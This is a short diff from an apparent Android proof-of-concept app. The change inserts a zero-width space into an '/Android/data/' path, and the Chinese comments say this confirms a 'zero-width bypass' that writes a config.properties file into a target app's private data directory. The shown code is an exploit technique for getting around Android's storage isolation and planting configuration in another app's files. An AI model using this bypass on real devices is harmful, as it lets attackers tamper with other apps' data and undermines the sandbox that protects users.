@@ -46,7 +46,7 @@ public class MainActivity extends AppCompatActivity {
                 // 验证是否写入到了真正的 /Android/data/ 目录
                 File verifyFile = new File(
                         Environment.getExternalStorageDirectory().getAbsolutePath()
-                                + "/Android/data/" + targetApp + "/files/config.properties");
+                                + "/Android/\u200bdata/" + targetApp + "/files/config.properties");
 
                 if (verifyFile.exists() && verifyFile.length() > 0) {
                     // 零宽绕过成功（文件确实出现在真正的 data 目录下）
